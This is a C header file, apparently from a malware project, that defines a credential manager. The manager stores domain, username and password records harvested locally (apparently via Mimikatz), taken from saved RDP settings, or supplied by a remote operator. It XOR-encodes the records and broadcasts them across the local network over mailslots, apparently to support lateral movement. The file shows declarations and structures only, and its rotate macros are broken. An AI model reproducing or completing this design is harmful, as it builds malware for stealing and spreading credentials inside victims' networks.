/*
	CredManager.h
*/
#pragma once
#include <Windows.h>

#include "MyStreams.h"

typedef enum ENUM_CRED_ORIGIN {
	CRED_ORIGIN_NOT_SET = 0,// not set yet
	CRED_ORIGIN_LOCAL,		// gathered locally by mimi
	CRED_ORIGIN_NETWORK,	// received in broadcasted message in local network
	CRED_ORIGIN_SAVED_RDP,			// got from analysing locally saved rdp settings (credentials manager or .rdp file)
	CRED_ORIGIN_BUILTIN = 254,	// supplied by embedded config
	CRED_ORIGIN_SERVER = 255		// supplied by remote operator
};

// single encrypted / encoded buffer
// max reasonable buffer len is 128, due to:
// max_domain = 15, max_username = 104, max_machine_name = 15, max_password_len = 26-32 chars
// may be reduced up to 64 without any impact on most machines
#define ENC_BUFFER_SIZE 104*2
#if ENC_BUFFER_SIZE > 255
#pragma error("ENC_BUFFER_SIZE cannot be larger than 255 bytes (128 wchars)")
#endif
typedef struct _ENC_BUFFER
{
	BYTE bEncBuffer[ENC_BUFFER_SIZE];
	BYTE bEncBufferLen;
} ENC_BUFFER, *PENC_BUFFER;

// single record of a locally stored, encrypted/encoded and searchable credentials
typedef struct _CREDENTIALS_RECORD
{
	// hash values to perform search 
	UINT64 i64DomainHash;		// to select account from a specific domain
	UINT64 i64SourceMachineHash;	// hashed name of machine, where this account was gathered
	UINT64 i64DomainUsernameHash;		// to prevent dups from adding - domain + username hash. 
	UINT64 i64PasswordHash;				// used in conjunction with ^ to detect new passwords (not sure if it will be really used)

	ENUM_CRED_ORIGIN coOrigin;			// origin type of account, as for local point, see ENUM_CRED_ORIGIN for possible values
	ENUM_CRED_ORIGIN coOrigin2;			// original origin, if this record was ever broadcasted. Should be saved when re-broadcasting. ceOrigin is CRED_ORIGIN_NETWORK in case this value used
	BYTE bAccessLevel;			// (TBD)to prefer more-powerfull record, for ex. admin instead of user



	// timestamp when this account was received, according to local time (UTC) - GetSystemTimeAsFileTime()
	FILETIME ftReceived;

	// timestamp when this account was gathered by source, read from broadcast message itself (UTC) - GetSystemTimeAsFileTime()
	FILETIME ftGathered;

	ENC_BUFFER ebSourceMachineName;	// name from where this account was originally received, may be NULL or name of local machine

	// account parts, ONLY STATIC BUFFERS, no extra ptrs
	ENC_BUFFER ebDomain;
	ENC_BUFFER ebUsername;
	ENC_BUFFER ebPassword;

	// internally maintained values
	DWORD dwLastSentTicks;		// ticks stamp when this chunk was broadcasted, used by cmStartupNetworkBroadcaster() and others to select an item to send with min value of this item

} CREDENTIALS_RECORD, *PCREDENTIALS_RECORD;

// passed to cmAddCredentials() instead of many params
// original values to be mapped to CREDENTIALS_RECORD 
typedef struct _ADD_CREDS_RECORD {
	DWORD dwLen;		// structure size for validation
	LPWSTR wszDomain;
	LPWSTR wszUsername;
	LPWSTR wszPassword;
	ENUM_CRED_ORIGIN coOrigin; 
	ENUM_CRED_ORIGIN coOrigin2; 
	LPWSTR wszSourceMachineName; 
	BYTE bAccessLevel;
	FILETIME ftReceived;
	FILETIME ftGathered;
} ADD_CREDS_RECORD, *PADD_CREDS_RECORD;

// single chunk pointer by linked list
typedef struct _CRED_LIST_CHUNK CRED_LIST_CHUNK;
typedef struct _CRED_LIST_CHUNK
{
	CRED_LIST_CHUNK *lcNext;
	CREDENTIALS_RECORD cr;	// NB: payload in head item is not used

} CRED_LIST_CHUNK, *PCRED_LIST_CHUNK;


// params passed to enum callback function from cmGetCredentialsForDomain()
typedef struct _GCFD_CALLBACK_PARAMS {
	UINT64 i64DomainHash;		// domain to search records for

	LPWSTR wszUsernameOut;	// out buffer for username
	LPWSTR wszPasswordOut;	// out buffer for password

	BYTE bAccessLevel;	// to prefer more powerfull record instead of others
	BOOL bFound;			// set to TRUE if any record was found

	MY_STREAM *msEnumContext;	// enum context stream to hold all passed domain+username hashes to prevent enum of duplicates

} GCFD_CALLBACK_PARAMS, *PGCFD_CALLBACK_PARAMS;


// params from cmAddCredentials() to it's processing enum callback
// used to check for dups and outdated records
typedef struct _AC_CALLBACK_PARAMS {
	
	UINT64 i64DomainUsernameHash;		// first point to check for dups
	UINT64 i64PasswordHash;				// to check if we have another password for that record
	ENUM_CRED_ORIGIN ceOrigin;			// to prefer local values of creds instead of data, received from network, when found duplicating record
	FILETIME ftGathered;				// to prefer more recent values instead of outdated when another password is detected, after origin check

	BOOL bIsDuplicate;			// set by enum function when it detects a duplicating record, so it will not be added
} AC_CALLBACK_PARAMS, *PAC_CALLBACK_PARAMS;

// params for enum callback called by thrcmCredBroadcaster() thread
typedef struct _TCB_CALLBACK_PARAMS {

	CRED_LIST_CHUNK *orig_chunk_ptr;	// ptr to the chunk itself in the chain, to be checked if it still exists in the chain when thread holds the lock second time
	CRED_LIST_CHUNK chunk;				// local buffer with chunk's data, due to possibility of chunk removed while we are broadcasting it

} TCB_CALLBACK_PARAMS, *PTCB_CALLBACK_PARAMS;

// params for enum callback from _cmChainContainsChunk()
typedef struct _CCC_CALLBACK_PARAMS {

	CRED_LIST_CHUNK *check_ptr;
	BOOL bFound;

} CCC_CALLBACK_PARAMS, *PCCC_CALLBACK_PARAMS;

// structure of data broadcasted, only fixed fields here
// all varlen fields are attached lower after this structure
#pragma pack(push)	// save structure pack settings
#pragma pack(1)		// remove alignment
typedef struct _SERIALIZED_CREDS_BUFFER
{
	// used to encode all further elements
	DWORD dwRandomKey1;
	DWORD dwRandomKey2;

	LARGE_INTEGER liGatheredStamp;	// stamp when it was originally gathered on original source machine
	BYTE bOrigin2;		// original source of this creds
	BYTE bAccessLevel;

	// lens of varlen fields (NB: in bytes, for encoded wchar string)
	BYTE blen_SourceMachineName;
	BYTE blen_Domain;
	BYTE blen_Username;
	BYTE blen_Password;

} SERIALIZED_CREDS_BUFFER, *PSERIALIZED_CREDS_BUFFER;
#pragma pack(pop)	// restore previous alignment settings

// cycle shifts definitions
#define ROL32(x, r) (x >> r) | (x << (32 - r));
#define ROR32(x, r) (x >> r) 


// callback invoked by _cmEnumRecords()
typedef BOOL(CALLBACK* CM_ENUM_CALLBACK)(CRED_LIST_CHUNK *, LPVOID);

// define functions for import-export, used in both compilation modes
typedef struct _CredManager_ptrs {

	FILETIME(*fncmftNow)();
	BOOL(*fncmAddCredentials)(ADD_CREDS_RECORD *acr);
	BOOL(*fncmGetCredentialsForDomain)(LPWSTR wszDomain, LPWSTR wszUsernameOut, LPWSTR wszPasswordOut, MY_STREAM *msEnumContext);

} CredManager_ptrs, *PCredManager_ptrs;




#ifdef ROUTINES_BY_PTR

#pragma message(__FILE__": ROUTINES_BY_PTR compilation mode")

// global var definition to be visible by all modules which use this one
extern CredManager_ptrs CredManager_apis;

// transparent code replacements
#define cmftNow CredManager_apis.fncmftNow
#define cmAddCredentials CredManager_apis.fncmAddCredentials
#define cmGetCredentialsForDomain CredManager_apis.fncmGetCredentialsForDomain

VOID CredManager_resolve(CredManager_ptrs *apis);

#else

#include "DataCallbackManager.h"

VOID cmStartupNetworkListener();	// not exported to modules
VOID cmStartupNetworkBroadcaster();	// not exported to modules
BOOL CALLBACK cmMailslotBroadcastInProcessingDataCallback(DISPATCHER_CALLBACK_PARAMS *dcp);	// not exported to modules
VOID _cmDoXor(DWORD dwKey1, DWORD dwKey2, LPVOID pBuffer, DWORD lBufferLen); // not exported to modules

FILETIME cmftNow();
BOOL cmAddCredentials(ADD_CREDS_RECORD *acr);
BOOL cmGetCredentialsForDomain(LPWSTR wszDomain, LPWSTR wszUsernameOut, LPWSTR wszPasswordOut, MY_STREAM *msEnumContext);

VOID CredManager_imports(CredManager_ptrs *apis);

#endif